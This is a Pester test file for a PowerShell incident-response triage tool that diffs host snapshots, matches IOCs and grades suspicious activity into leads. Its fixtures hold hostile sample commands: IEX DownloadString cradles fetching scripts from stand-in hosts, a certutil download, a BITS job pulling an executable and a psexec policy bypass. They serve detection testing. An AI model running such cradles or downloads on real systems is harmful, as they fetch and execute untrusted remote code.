#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '5.0.0' }

BeforeAll {
    $repo = Split-Path -Parent $PSScriptRoot
    $analyst = Join-Path $repo 'analyst'
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    . (Join-Path $analyst 'TriageCommon.ps1')
    $root = Join-Path ([System.IO.Path]::GetTempPath()) ("irtriage-tests-" + [guid]::NewGuid().ToString('N').Substring(0, 8))
    $baselineZip = New-FakeTriage -Path (Join-Path $root 'baseline') -Data (Get-BaselineData) -Zip
    $suspectZip = New-FakeTriage -Path (Join-Path $root 'suspect') -Data (Get-SuspectData) -ComputerName 'WS-0193' -Zip
}

AfterAll {
    if ($root -and (Test-Path -LiteralPath $root)) { Remove-Item -LiteralPath $root -Recurse -Force }
}

Describe 'Import-IRTriage' {
    It 'loads a zip and verifies integrity' {
        $t = Import-IRTriage -Path $suspectZip
        $t.Host | Should -Be 'WS-0193'
        $t.Integrity.Valid | Should -BeTrue
        $t.Integrity.Zip.Match | Should -BeTrue
        @($t.Data['services']).Count | Should -Be 2
    }

    It 'unrolls single-element and empty JSON arrays consistently' {
        $t = Import-IRTriage -Path $suspectZip
        @($t.Data['dns_cache']).Count | Should -Be 1
        @($t.Data['dns_cache'])[0].Data | Should -Be '203.0.113.50'
        $b = Import-IRTriage -Path $baselineZip
        @($b.Data['autoruns_registry']).Count | Should -Be 0
    }

    It 'flags a tampered evidence file' {
        $copy = Join-Path $root 'tampered'
        Copy-Item -LiteralPath (Join-Path $root 'suspect') -Destination $copy -Recurse
        Add-Content -LiteralPath (Join-Path $copy 'services.json') -Value ' '
        $t = Import-IRTriage -Path $copy
        $t.Integrity.Valid | Should -BeFalse
        $t.Integrity.Problems.File | Should -Contain 'services.json'
    }
}

Describe 'Compare-Triage.ps1' {
    BeforeAll { $diff = @(& (Join-Path $analyst 'Compare-Triage.ps1') -Baseline $baselineZip -Suspect $suspectZip) }

    It 'reports the added service' {
        $diff | Where-Object { $_.Category -eq 'services' -and $_.Change -eq 'Added' -and $_.Key -eq 'UpdaterSvc' } | Should -Not -BeNullOrEmpty
    }
    It 'reports the added local admin' {
        $diff | Where-Object { $_.Category -eq 'local_admins' -and $_.Key -like '*svc_backup' } | Should -Not -BeNullOrEmpty
    }
    It 'reports the added Run key' {
        $diff | Where-Object { $_.Category -eq 'autoruns_registry' -and $_.Change -eq 'Added' } | Should -Not -BeNullOrEmpty
    }
    It 'does not report unchanged items' {
        $diff | Where-Object { $_.Key -eq 'Spooler' } | Should -BeNullOrEmpty
    }
    It 'filters by change type' {
        $added = @(& (Join-Path $analyst 'Compare-Triage.ps1') -Baseline $baselineZip -Suspect $suspectZip -Change Added)
        @($added | Where-Object Change -ne 'Added').Count | Should -Be 0
    }
}

Describe 'Find-IOC.ps1' {
    BeforeAll {
        $iocCsv = Join-Path $root 'iocs.csv'
        @(
            [pscustomobject]@{ Type = ''; Value = '203.0.113.50'; Description = 'C2' },
            [pscustomobject]@{ Type = ''; Value = 'evil-cdn.example'; Description = 'stager domain' },
            [pscustomobject]@{ Type = ''; Value = ('ab' * 32); Description = 'payload hash' },
            [pscustomobject]@{ Type = ''; Value = '203.0.113.5'; Description = 'must not match .50' }
        ) | Export-Csv -LiteralPath $iocCsv -NoTypeInformation
        $hits = @(& (Join-Path $analyst 'Find-IOC.ps1') -Path $suspectZip -IocFile $iocCsv 6>$null)
    }

    It 'matches the IP in connections and DNS cache' {
        @($hits | Where-Object { $_.Indicator -eq '203.0.113.50' }).Collector | Should -Contain 'network_connections'
        @($hits | Where-Object { $_.Indicator -eq '203.0.113.50' }).Collector | Should -Contain 'dns_cache'
    }
    It 'does not match an IP that is only a prefix of another' {
        $hits | Where-Object { $_.Indicator -eq '203.0.113.5' } | Should -BeNullOrEmpty
    }
    It 'matches a domain inside a command line and its subdomain in DNS' {
        $d = @($hits | Where-Object { $_.Indicator -eq 'evil-cdn.example' })
        $d.Collector | Should -Contain 'processes'
        $d.Collector | Should -Contain 'dns_cache'
    }
    It 'matches hashes case-insensitively' {
        $hits | Where-Object { $_.IndicatorType -eq 'hash' -and $_.Collector -eq 'processes' } | Should -Not -BeNullOrEmpty
    }
    It 'accepts inline indicators' {
        $h = @(& (Join-Path $analyst 'Find-IOC.ps1') -Path $suspectZip -Indicator 'upd.exe' 6>$null)
        $h.Collector | Should -Contain 'services'
    }
}

Describe 'Get-IRTriageLeads' {
    BeforeAll { $leads = @(Get-IRTriageLeads -Triage (Import-IRTriage -Path $suspectZip)) }

    It 'raises a high lead for the download-cradle command line' {
        $leads | Where-Object { $_.Severity -eq 'high' -and $_.Title -like 'Suspicious command line: powershell.exe*' } | Should -Not -BeNullOrEmpty
    }
    It 'raises a high lead for Office spawning PowerShell' {
        $leads | Where-Object { $_.Severity -eq 'high' -and $_.Title -like 'Office/PDF app spawned*' } | Should -Not -BeNullOrEmpty
    }
    It 'raises a high lead for a LOLBin with an external connection' {
        $leads | Where-Object { $_.Severity -eq 'high' -and $_.Title -like 'External connections from powershell.exe*' } | Should -Not -BeNullOrEmpty
    }
    It 'raises a high lead for the encoded Run key' {
        $leads | Where-Object { $_.Severity -eq 'high' -and $_.Category -eq 'Persistence' -and $_.Title -like 'Autorun*' } | Should -Not -BeNullOrEmpty
    }
    It 'flags the service in a user-writable path' {
        $leads | Where-Object { $_.Title -like 'Service UpdaterSvc*' } | Should -Not -BeNullOrEmpty
    }
    It 'sorts high leads first' {
        $leads[0].Severity | Should -Be 'high'
    }
}

Describe 'ConvertTo-TriageReport.ps1' {
    BeforeAll {
        $out = Join-Path $root 'report.html'
        $null = & (Join-Path $analyst 'ConvertTo-TriageReport.ps1') -Path $suspectZip -OutFile $out -BaselinePath $baselineZip 6>$null
        $html = [System.IO.File]::ReadAllText($out)
    }
    It 'writes the host, integrity status and baseline diff' {
        $html | Should -Match 'WS-0193'
        $html | Should -Match 'Integrity verified'
        $html | Should -Match 'Baseline diff'
    }
    It 'shows the host IP address under the host name' {
        $html | Should -Match '(?s)class="host">WS-0193</h1>\s*<p class="ip"><span class="label">IP address</span><span class="primary">10\.0\.0\.5</span>'
    }
    It 'is self-contained (no external scripts, styles or fonts)' {
        $html | Should -Not -Match '<script[^>]+src='
        $html | Should -Not -Match '<link[^>]+href='
        $html | Should -Not -Match '@import'
    }
    It 'HTML-encodes collected data' {
        $html | Should -Not -Match '<img src=x'
        $html | Should -Match '&lt;img src=x'
    }
    It 'makes every data table resizable and marks lead severity on rows' {
        $html | Should -Match '<table data-resizable id="leads-table">'
        $html | Should -Match '<tr class="sev-high" data-sev="high">'
    }
    It 'falls back to network_config for the IP when the manifest has none' {
        $d = Get-BaselineData
        $d.network_config = @([pscustomobject]@{
            IPAddresses   = @([pscustomobject]@{ InterfaceAlias = 'Ethernet'; IPAddress = '172.20.1.9'; AddressFamily = 'IPv4' })
            DefaultRoutes = @([pscustomobject]@{ InterfaceAlias = 'Ethernet'; DestinationPrefix = '0.0.0.0/0' })
        })
        $old = New-FakeTriage -Path (Join-Path $root 'old-format') -Data $d -NoHostIp
        $o = Join-Path $root 'old.html'
        $null = & (Join-Path $analyst 'ConvertTo-TriageReport.ps1') -Path $old -OutFile $o 6>$null
        [System.IO.File]::ReadAllText($o) | Should -Match '<span class="primary">172\.20\.1\.9</span>'
    }
}
Describe 'PowerShell history timestamps' {
    BeforeAll {
        $sid = 'S-1-5-21-1-2-3-1001'
        $ev = { param($id, $text, $time, $user) [pscustomobject]@{ TimeCreated = $time; EventId = 4104; RecordId = (Get-Random); UserId = $user; Data = [pscustomobject]@{ MessageNumber = '1'; MessageTotal = '1'; ScriptBlockText = $text; ScriptBlockId = $id; Path = '' } } }
        $h = { param($n, $cmd) [pscustomobject]@{ User = 'jdoe'; UserSid = $sid; File = 'ConsoleHost_history.txt'; LineNumber = $n; Command = $cmd; FileCreatedUtc = '2026-01-01T00:00:00.0000000Z'; FileLastWriteUtc = '2026-01-01T12:00:00.0000000Z' } }
        $d = Get-BaselineData
        $d.powershell_history = @(
            (& $h 1 'whoami'), (& $h 2 'Get-Process'), (& $h 3 'whoami'), (& $h 4 "Get-Date |`nOut-String"), (& $h 5 'ipconfig')
        )
        $d.events_powershell = @(
            (& $ev 'w1' 'whoami' '2026-01-01T10:00:00.0000000Z' $sid),
            (& $ev 'w2' 'whoami' '2026-01-01T11:00:00.0000000Z' $sid),
            (& $ev 'm1' "Get-Date |`r`nOut-String" '2026-01-01T11:30:00.0000000Z' $sid),
            (& $ev 'i1' 'ipconfig' '2026-01-01T11:45:00.0000000Z' 'S-1-5-21-9-9-9-500')
        )
        $p = New-FakeTriage -Path (Join-Path $root 'histtime') -Data $d
        $tl = @(Get-IRHistoryTimeline (Import-IRTriage -Path $p))
    }
    It 'dates repeated commands to separate script blocks, in history order' {
        ($tl | Where-Object LineNumber -eq 1).RanAt | Should -Be '2026-01-01 10:00:00Z'
        ($tl | Where-Object LineNumber -eq 3).RanAt | Should -Be '2026-01-01 11:00:00Z'
        ($tl | Where-Object LineNumber -eq 1).TimeBasis | Should -Be 'exact'
    }
    It 'bounds an undated line by its dated neighbours' {
        $r = $tl | Where-Object LineNumber -eq 2
        $r.TimeBasis | Should -Be 'range'
        $r.RanAt | Should -Be '2026-01-01 10:00:00Z to 2026-01-01 11:00:00Z'
    }
    It 'matches multi-line commands regardless of line endings' {
        ($tl | Where-Object LineNumber -eq 4).RanAt | Should -Be '2026-01-01 11:30:00Z'
    }
    It 'ignores script blocks from another user and falls back to the file save time for the last line' {
        $r = $tl | Where-Object LineNumber -eq 5
        $r.TimeBasis | Should -Be 'approx'
        $r.RanAt | Should -Be '~2026-01-01 12:00:00Z'
    }
    It 'shows the times in the report' {
        $o = Join-Path $root 'histtime.html'
        $null = & (Join-Path $analyst 'ConvertTo-TriageReport.ps1') -Path $p -OutFile $o 6>$null
        $html = [System.IO.File]::ReadAllText($o)
        $html | Should -Match 'Ran at \(UTC\)'
        $html | Should -Match '2026-01-01 10:00:00Z to 2026-01-01 11:00:00Z'
    }
}

Describe 'Script block and log coverage leads' {
    BeforeAll {
        function New-Sb([string]$Id, [int]$N, [int]$Of, [string]$Text, [string]$Time = '2026-01-01T00:00:00Z', [string]$Path = '') {
            [pscustomobject]@{ TimeCreated = $Time; EventId = 4104; RecordId = (Get-Random); Data = [pscustomobject]@{ MessageNumber = "$N"; MessageTotal = "$Of"; ScriptBlockText = $Text; ScriptBlockId = $Id; Path = $Path } }
        }
        $d = Get-BaselineData
        $d.events_powershell = @(
            # One malicious block split over two chunks: the pattern only matches once reassembled.
            (New-Sb 'aaa' 1 2 '$c = New-Object Net.WebClient; IEX ($c.Downlo'),
            (New-Sb 'aaa' 2 2 'adString("http://203.0.113.9/p.ps1"))'),
            # The same benign base64 helper run three times.
            (New-Sb 'b1' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T01:00:00Z'),
            (New-Sb 'b2' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T02:00:00Z'),
            (New-Sb 'b3' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T03:00:00Z'),
            # Execution policy bypass alone: review, not dropped.
            (New-Sb 'c1' 1 1 'psexec -s powershell.exe -ExecutionPolicy Bypass -File C:\tools\x.ps1'),
            # IRTriage's own code (contains the patterns it looks for).
            (New-Sb 'self' 1 1 '$script:IRToolVersion = ''2.1.1''; # DownloadString IEX( FromBase64String' '2026-01-01T00:00:00Z' 'C:\IR\Invoke-IRTriage.ps1')
        )
        $coverage = @{ events_powershell = @{ logCoverage = @(
            [pscustomobject]@{ log = 'Microsoft-Windows-PowerShell/Operational'; oldestEventUtc = '2026-01-01T08:00:00.0000000Z'; lookbackStartUtc = '2025-12-29T00:00:00.0000000Z'; coversLookback = $false; logMode = 'Circular'; maxSizeMB = 15; fileSizeMB = 15; isFull = $true; recordCount = 500; eventsCollected = 7; truncatedAtMaxEvents = $false }
        ) } }
        $zip = New-FakeTriage -Path (Join-Path $root 'sblocks') -Data $d -CollectorExtras $coverage -Zip
        $leads = @(Get-IRTriageLeads -Triage (Import-IRTriage -Path $zip))
        $sb = @($leads | Where-Object { $_.Title -like 'Suspicious PowerShell script block*' })
    }
    It 'reassembles chunks of one script block before matching' {
        $sb | Where-Object { $_.Severity -eq 'high' -and $_.Title -match 'download cradle' } | Should -Not -BeNullOrEmpty
    }
    It 'groups identical blocks into one lead with a count' {
        @($sb | Where-Object { $_.Title -match 'base64 decode' }).Count | Should -Be 1
        ($sb | Where-Object { $_.Title -match 'base64 decode' }).Title | Should -Match 'x3$'
    }
    It 'grades base64 decode alone as review' {
        ($sb | Where-Object { $_.Title -match 'base64 decode' }).Severity | Should -Be 'review'
    }
    It 'keeps execution-policy-bypass blocks as review instead of dropping them' {
        $sb | Where-Object { $_.Severity -eq 'review' -and $_.Title -match 'execution policy bypass' -and $_.Detail -match 'psexec' } | Should -Not -BeNullOrEmpty
    }
    It 'does not grade IRTriage''s own code, but reports it with its path' {
        $sb | Where-Object { $_.Detail -match 'IRToolVersion' } | Should -BeNullOrEmpty
        $self = $leads | Where-Object { $_.Title -like "IRTriage's own code*" }
        $self.Severity | Should -Be 'info'
        $self.Detail | Should -Match 'C:\\IR\\Invoke-IRTriage\.ps1'
    }
    It 'raises a review lead when a full log does not reach back to the lookback start' {
        $cov = $leads | Where-Object { $_.Title -like 'Microsoft-Windows-PowerShell/Operational only reaches back*' }
        $cov.Severity | Should -Be 'review'
        $cov.Detail | Should -Match 'full \(15 of 15 MB'
    }
}

Describe 'Processes, pipes, BITS, PowerShell history and 4688' {
    BeforeAll {
        $d = Get-SuspectData
        $d.processes = @(
            [pscustomobject]@{ ProcessId = 4; ParentProcessId = 0; ParentName = $null; Name = 'System' },
            [pscustomobject]@{ ProcessId = 700; ParentProcessId = 4; ParentName = 'System'; Name = 'smss.exe' },
            [pscustomobject]@{ ProcessId = 3000; ParentProcessId = 2000; ParentName = 'explorer.exe'; Name = 'winword.exe' },
            [pscustomobject]@{ ProcessId = 4242; ParentProcessId = 3000; ParentName = 'winword.exe'; Name = 'powershell.exe'; CommandLine = 'powershell.exe -c whoami' },
            [pscustomobject]@{ ProcessId = 9999; ParentProcessId = 8888; ParentName = $null; Name = 'orphan.exe' }
        )
        $d.named_pipes = @(
            [pscustomobject]@{ PipeName = 'msagent_4f' }, [pscustomobject]@{ PipeName = 'PSEXESVC' },
            [pscustomobject]@{ PipeName = 'mojo.1234.5678.123456789' }, [pscustomobject]@{ PipeName = 'lsass' }
        )
        $d.bits_jobs = @(
            [pscustomobject]@{ DisplayName = 'Updater'; Owner = 'CORP\jdoe'; JobState = 'Transferred'; RemoteNames = 'http://203.0.113.50/p.exe'; LocalNames = 'C:\Users\Public\p.exe'; NotifyCmdLine = 'C:\Users\Public\p.exe' },
            [pscustomobject]@{ DisplayName = 'Grabber'; Owner = 'CORP\jdoe'; JobState = 'Transferred'; RemoteNames = 'https://files.example.net/x.zip'; LocalNames = 'C:\Temp\x.zip'; NotifyCmdLine = $null },
            [pscustomobject]@{ DisplayName = 'WU'; Owner = 'NT AUTHORITY\SYSTEM'; JobState = 'Transferred'; RemoteNames = 'http://dl.delivery.mp.microsoft.com/a.cab'; LocalNames = 'C:\Windows\a.cab'; NotifyCmdLine = $null }
        )
        $d.powershell_history = @(
            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 1; Command = 'Get-ChildItem' },
            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 2; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' },
            [pscustomobject]@{ User = 'jdoe'; File = 'ConsoleHost_history.txt'; LineNumber = 3; Command = 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")' }
        )
        $d.installed_software = @(
            [pscustomobject]@{ Type = 'Desktop'; Scope = 'Machine'; DisplayName = 'AnyDesk'; DisplayVersion = '9.0.1'; Publisher = 'AnyDesk Software GmbH'; InstallDate = '2026-01-01'; InstallLocation = 'C:\Program Files (x86)\AnyDesk'; SignatureKind = $null },
            [pscustomobject]@{ Type = 'Desktop'; Scope = 'Machine'; DisplayName = '7-Zip 24.08 (x64)'; DisplayVersion = '24.08'; Publisher = 'Igor Pavlov'; InstallDate = $null; InstallLocation = 'C:\Program Files\7-Zip\'; SignatureKind = $null },
            [pscustomobject]@{ Type = 'Store'; Scope = 'User:CORP\jdoe'; DisplayName = 'Microsoft.WindowsCalculator'; DisplayVersion = '11.2405.2.0'; Publisher = 'Microsoft Corporation'; InstallDate = '2025-06-01'; InstallLocation = 'C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_x'; SignatureKind = 'Store' },
            [pscustomobject]@{ Type = 'Store'; Scope = 'User:CORP\jdoe'; DisplayName = 'Contoso.Helper'; DisplayVersion = '1.0.0.0'; Publisher = 'Contoso'; InstallDate = '2026-01-01'; InstallLocation = 'C:\Program Files\WindowsApps\Contoso.Helper_x'; SignatureKind = 'Developer' }
        )
        $evt = { param($id, $data) [pscustomobject]@{ TimeCreated = '2026-01-01T00:00:00Z'; LogName = 'Security'; EventId = $id; Data = [pscustomobject]$data } }
        $d.events_process_creation = @(
            (& $evt 4688 @{ CommandLine = 'certutil.exe -urlcache -f http://x/a a.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; ParentProcessName = 'C:\Windows\System32\cmd.exe' }),
            (& $evt 4688 @{ CommandLine = 'certutil.exe -urlcache -f http://x/a a.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; ParentProcessName = 'C:\Windows\System32\cmd.exe' }),
            (& $evt 4688 @{ CommandLine = 'notepad.exe'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe' })
        )
        $d.events_security = @(
            (& $evt 4698 @{ TaskName = '\EvilTask'; SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe' }),
            (& $evt 4702 @{ TaskName = '\Microsoft\Windows\UpdateOrchestrator\Schedule Scan'; SubjectDomainName = 'NT AUTHORITY'; SubjectUserName = 'SYSTEM' }),
            (& $evt 4719 @{ SubjectDomainName = 'CORP'; SubjectUserName = 'jdoe'; SubcategoryGuid = '{0CCE922B-69AE-11D9-BED3-505054503030}'; AuditPolicyChanges = '%%8448' })
        )
        $p = New-FakeTriage -Path (Join-Path $root 'extended') -Data $d -ComputerName 'WS-0200'
        $t = Import-IRTriage -Path $p
        $leads = @(Get-IRTriageLeads -Triage $t)
        $o = Join-Path $root 'extended.html'
        $null = & (Join-Path $analyst 'ConvertTo-TriageReport.ps1') -Path $p -OutFile $o 6>$null
        $html = [System.IO.File]::ReadAllText($o)
    }

    It 'orders processes as a tree with orphans as roots' {
        $rows = @(Get-IRProcessTreeRows @($t.Data['processes']))
        ($rows | ForEach-Object { [int]$_.ProcessId }) -join ',' | Should -Be '4,700,3000,4242,9999'
        ($rows | Where-Object ProcessId -eq 700).TreeName | Should -Be '\_ smss.exe'
        ($rows | Where-Object ProcessId -eq 4242).TreeName | Should -Be '\_ powershell.exe'
    }
    It 'has a Processes section with PIDs' {
        $html | Should -Match '<section id="processes">'
        $html | Should -Match '<table data-resizable id="proc-table">'
        $html | Should -Match '<td class="num">4242</td>'
    }
    It 'shows PowerShell history under Users and sessions' {
        $html | Should -Match 'id="pshist-table"'
        $html | Should -Match 'Net\.WebClient'
    }
    It 'raises C2 pipe names as high and PsExec as review, ignoring benign pipes' {
        ($leads | Where-Object Title -eq 'Named pipe msagent_4f').Severity | Should -Be 'high'
        ($leads | Where-Object Title -eq 'Named pipe PSEXESVC').Severity | Should -Be 'review'
        @($leads | Where-Object Collector -eq 'named_pipes').Count | Should -Be 2
    }
    It 'grades BITS jobs: notify command high, foreign download review, Microsoft ignored' {
        ($leads | Where-Object Title -like "BITS job 'Updater'*").Severity | Should -Be 'high'
        ($leads | Where-Object Title -like "BITS job 'Grabber'*").Severity | Should -Be 'review'
        $leads | Where-Object Title -like "BITS job 'WU'*" | Should -BeNullOrEmpty
    }
    It 'raises one lead per distinct suspicious history command' {
        @($leads | Where-Object Collector -eq 'powershell_history').Count | Should -Be 1
        ($leads | Where-Object Collector -eq 'powershell_history').Severity | Should -Be 'high'
    }
    It 'groups suspicious 4688 command lines' {
        $l = @($leads | Where-Object Collector -eq 'events_process_creation')
        $l.Count | Should -Be 1
        $l[0].Detail | Should -Match 'x2'
    }
    It 'reports non-Microsoft task creation and audit policy changes, not Microsoft task updates' {
        $leads | Where-Object Title -eq 'Scheduled task created: \EvilTask' | Should -Not -BeNullOrEmpty
        $leads | Where-Object Title -like 'System audit policy changed*' | Should -Not -BeNullOrEmpty
        $leads | Where-Object Title -like 'Scheduled task updated*' | Should -BeNullOrEmpty
    }
    It 'shows installed applications with versions, desktop and Store' {
        $html | Should -Match '<section id="apps">'
        $html | Should -Match 'id="apps-table"'
        $html | Should -Match 'AnyDesk'
        $html | Should -Match '<td class="mono">9\.0\.1</td>'
        $html | Should -Match 'Contoso\.Helper'
    }
    It 'raises remote access tools and sideloaded packages as review, not ordinary apps' {
        ($leads | Where-Object Title -like 'Remote access tool installed: AnyDesk*').Severity | Should -Be 'review'
        ($leads | Where-Object Title -like 'Sideloaded app package: Contoso.Helper*').Severity | Should -Be 'review'
        $leads | Where-Object Title -like '*7-Zip*' | Should -BeNullOrEmpty
        $leads | Where-Object Title -like '*WindowsCalculator*' | Should -BeNullOrEmpty
    }
    It 'adds collapse controls without hiding anything in the HTML itself' {
        $html | Should -Match 'data-fold-all="collapse"'
        $html | Should -Match 'function makeFold'
        $html | Should -Not -Match 'class="fold-body"'
    }
    It 'diffs BITS jobs against a baseline' {
        $bp = New-FakeTriage -Path (Join-Path $root 'bits-base') -Data (@{ bits_jobs = @($d.bits_jobs[2]) })
        $diff = @(& (Join-Path $analyst 'Compare-Triage.ps1') -Baseline $bp -Suspect $p -Category bits_jobs)
        @($diff | Where-Object Change -eq 'Added').Count | Should -Be 2
    }
}
